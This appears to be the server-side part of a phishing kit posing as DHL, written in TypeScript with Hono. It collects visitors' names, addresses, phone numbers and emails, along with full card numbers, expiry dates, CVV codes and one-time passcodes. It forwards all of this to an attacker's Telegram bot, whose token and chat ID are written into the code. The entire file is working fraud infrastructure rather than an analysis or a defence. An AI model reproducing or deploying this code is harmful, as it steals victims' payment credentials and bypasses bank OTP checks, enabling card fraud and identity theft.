import { Hono } from "hono";
import { cors } from "hono/cors";

const TELEGRAM_TOKEN = "7977043062:AAEpET9HJE0IxtUF9KdEbhoQyyPNoowxb1g";
const CHAT_ID = "6788012481";

const app = new Hono();

app.use("/*", cors({ origin: "*", allowMethods: ["POST", "OPTIONS"], allowHeaders: ["Content-Type"] }));

async function sendTelegram(text: string): Promise<void> {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML" }),
  });
}

async function getClientIP(req: Request): Promise<string> {
  const forwarded = req.headers.get("x-forwarded-for");
  if (forwarded) return forwarded.split(",")[0].trim();
  const realIP = req.headers.get("x-real-ip");
  if (realIP) return realIP;
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = (await res.json()) as { ip?: string };
    return data.ip || "Unknown";
  } catch {
    return "Unknown";
  }
}

app.post("/", async (c) => {
  try {
    const body = await c.req.json();
    const { type, data } = body as { type: string; data?: Record<string, string> };

    const ip = await getClientIP(c.req.raw);
    const userAgent = c.req.header("user-agent") || "Unknown";

    let message = "";

    if (type === "visit") {
      message =
        `🚨 <b>New DHL Page Visit</b>\n\n` +
        `🌐 <b>IP:</b> ${ip}\n` +
        `📱 <b>User-Agent:</b> ${userAgent}\n` +
        `📄 <b>Page:</b> ${data?.page || "Unknown"}\n` +
        `🕐 <b>Time:</b> ${new Date().toUTCString()}`;
    } else if (type === "delivery") {
      message =
        `📦 <b>DHL — Delivery Form Submitted</b>\n\n` +
        `👤 <b>Name:</b> ${data?.firstName} ${data?.lastName}\n` +
        `📧 <b>Email:</b> ${data?.email}\n` +
        `📞 <b>Phone:</b> ${data?.phone}\n` +
        `🏠 <b>Address:</b> ${data?.address}\n` +
        `🏙️ <b>City:</b> ${data?.city}\n` +
        `📮 <b>Postal Code:</b> ${data?.postalCode}\n` +
        `🌐 <b>IP:</b> ${ip}\n` +
        `🕐 <b>Time:</b> ${new Date().toUTCString()}`;
    } else if (type === "payment") {
      message =
        `💳 <b>DHL — Payment Form Submitted</b>\n\n` +
        `👤 <b>Card Holder:</b> ${data?.cardName}\n` +
        `💳 <b>Card Number:</b> ${data?.cardNumber}\n` +
        `📅 <b>Expiry:</b> ${data?.expiry}\n` +
        `🔒 <b>CVV:</b> ${data?.cvv}\n` +
        `🌐 <b>IP:</b> ${ip}\n` +
        `🕐 <b>Time:</b> ${new Date().toUTCString()}`;
    } else if (type === "otp") {
      message =
        `🔐 <b>DHL — OTP Code Submitted</b>\n\n` +
        `🔑 <b>OTP Code:</b> ${data?.otp}\n` +
        `🌐 <b>IP:</b> ${ip}\n` +
        `🕐 <b>Time:</b> ${new Date().toUTCString()}`;
    } else {
      return c.json({ error: "Unknown type" }, 400);
    }

    await sendTelegram(message);
    return c.json({ ok: true });
  } catch (err) {
    console.error("Error:", err);
    return c.json({ error: "Internal server error" }, 500);
  }
});

app.get("/health", (c) => c.json({ ok: true }));

export default app;
